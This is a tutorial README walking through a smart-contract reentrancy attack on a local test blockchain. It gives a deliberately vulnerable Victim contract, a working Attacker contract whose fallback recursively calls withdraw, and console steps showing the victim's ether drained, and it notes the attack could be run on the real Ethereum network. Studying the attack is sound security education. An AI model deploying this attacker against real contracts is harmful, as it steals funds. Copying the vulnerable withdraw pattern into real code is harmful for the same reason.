# Recreating Reentrancy Attack
The document below goes through a "reentrancy attack" scenario using 2 smart contract, a "Victim" and an "Attacker" contracts.

## Instructions

### 1. Run `TestRPC`

We run `testrpc` with the `-u` and `0` params to unlock the 1st account
(out of 10 provided by `TestRPC`) so we can make transactions from that account.

```
$ testrpc -u 0
```

### 2. Prereqs:

[NodeJS](https://nodejs.org/en/)

### Install TestRPC (testing blockchain) and TruffleJS (smart contract deployment tool)

```
$ npm i -g ethereumjs-testrpc
$ npm i -g truffle
```

### 3. Getting Started:

### Setup

```
$ mkdir reentrancy_attack
$ cd reentrancy_attack
$ truffle init
$ rm -rf test/ contracts/ConvertLib.sol contracts/MetaCoin.sol
$ touch contracts/Attacker.sol contracts/Victim.sol
```

#### inside of our `contracts/Victim.sol` file write:

```
pragma solidity ^0.4.8;

contract Victim {
  uint withdrawableBalance = 2 ether;

  function withdraw() {
    if (!msg.sender.call.value(withdrawableBalance)()) {
      throw;
    }

    withdrawableBalance = 0;
  }

  function deposit() payable {
    withdrawableBalance = msg.value;
  }
}
```

#### inside of our `contracts/Attacker.sol` file write:

```
pragma solidity ^0.4.8;

import './Victim.sol';

contract Attacker {
  Victim victim;

  function Attacker(address victimAddress) {
    victim = Victim(victimAddress);
  }

  function attack() {
    victim.withdraw();
  }

  // Fallback function which is called whenever Attacker receives ether
  function () payable {
    if (victim.balance >= msg.value) {
      victim.withdraw();
    }
  }
}
```

#### inside of our `migrations/2_deploy_contracts.js``` file write:

```
const Victim = artifacts.require('./Victim.sol')
const Attacker = artifacts.require('./Attacker.sol')

module.exports = function(deployer) {
  deployer
    .deploy(Victim)
    .then(() =>
      deployer.deploy(Attacker, Victim.address)
    )
}
```

### 3. Compile & Deploy Contract:

The command below creates a `build` folder, in the this
folder is your contracts in their `binary` and `abi` forms.

```
$ truffle compile
```

The command below `deploys` the contracts
(Migration, Victim, Attacker) to our test blockchain (testrpc).

```
$ truffle migrate
```

### 4. Open up the truffle/node console and deposit eth into our `Victim` contract instance.

So now we run the command below to get inside of the truffle console,
so we can interact with our deployed contracts (Victim, Attacker), and
utilize the `web3` object to to run `JSONRPC` commands.

```
$ truffle console
```

We're going to store the account we accounted from before in a `acct1` variable.

```
truffle(development)> acct1 = web3.eth.accounts[0]
```

Then we are going to store our `Victim` contract instances in a `victim` variable
so we can interact with the contract easily. The `.deployed` method gives us that instance.

```
truffle(development)> victim = Victim.deployed()
```

We'll also store our `Victim`'s contract address, so we can interact with it later.

```
truffle(development)> victim.then(contract => victimAddress = contract.address)
```

Now lets create a utility function so we can check address balance's and save key strokes.

```
truffle(development)> getBalance = web3.eth.getBalance
```

Now lets check the balance's of the 2 addresses we stored in variables. (acct1, victimAddress).

```
truffle(development)> web3.fromWei(getBalance(acct1).toString())

'99.9430758' // or something close to this
```

```
truffle(development)> web3.fromWei(getBalance(victimAddress).toString())

'0'
```

Now we are going to send our `Victim` contract some `ether`
from the `acct1` address we unlocked earlier.

```
truffle(development)> victim.then(contract => contract.deposit.sendTransaction({from: acct1, to: victimAddress, value: web3.toWei(10, 'ether')}))
```

So there's alot going on in this line of code, so lets break it down. Our
`Victim` contract instance has a `deposit` function with a payable modifier,
that allows us to send ether to that function/contract from our `acct1` address.
Here's another look at that function.

```
path: ./contracts/Victims.sol

line 10 - function deposit() payable {}
```

Now lets check the balance's of the 2 addresses again,
which should read or come close to the amounts below.

```
truffle(development)> web3.fromWei(getBalance(acct1).toString())

'89.9404373' // or somthing close to this
```

Now our victims contract has 11 ether balance.

```
truffle(development)> web3.fromWei(getBalance(victimAddress).toString())

'10'
```

### 5. Now for the `Attacker`'s side

So now that we have our `Victim`'s contract and we have
eth in that contract, lets steal some of that. but first lets check
if we even need any. (check attacker's balance)

```
attacker = Attacker.deployed()
```

```
attacker.then(contract => attackerAddress = contract.address)
```

```
truffle(development)> web3.fromWei(getBalance(attackerAddress).toString())

'0'
```

There shouldn't be any funds unless you've been stealing already!
After we have our scenario (all our variables set up). We can `contract.attack()`.

So from our `Attacker` contract instance we are going to call the `.attack()` method
that will then call the `Victim` contract instance's `withdraw()` method.

```
attacker.then(contract => contract.attack())
```

The `.attack()` method above calls withdraw which should only withdraw the withdrawable balance (2 ether in our example). The withdrawable balance should be zeroed out after calling withdraw. However, before zeroing out the withdrawable balance, our fallback function recursively calls withdraw until it drains all the ether from the victim.

Now if everything is done correctly, we can see the reflection of what happened
by checking the `Victim` and `Attacker`'s balances.

```
truffle(development)> web3.fromWei(getBalance(attackerAddress).toString())

'10'
```

```
truffle(development)> web3.fromWei(getBalance(victimAddress).toString())

'0'
```

So as you can see all the `Victim`'s ether is gone!!!

### 6. The Attack!!!

So the attacker finds a contract to attack, gets the contract's address and creates an
`Attacker` contract with an instances of the `Victim`'s contract to call against and targets the
the deployed `Victim`'s contract by address. Once it has all of those variables in place, the attacker can
deploy the malicious contract to the Ethereum network and then call the `.attack()` method to drain
all of the `Victim`'s ether.

### 7. Further reading

https://medium.com/@gus_tavo_guim/reentrancy-attack-on-smart-contracts-how-to-identify-the-exploitable-and-an-example-of-an-attack-4470a2d8dfe4
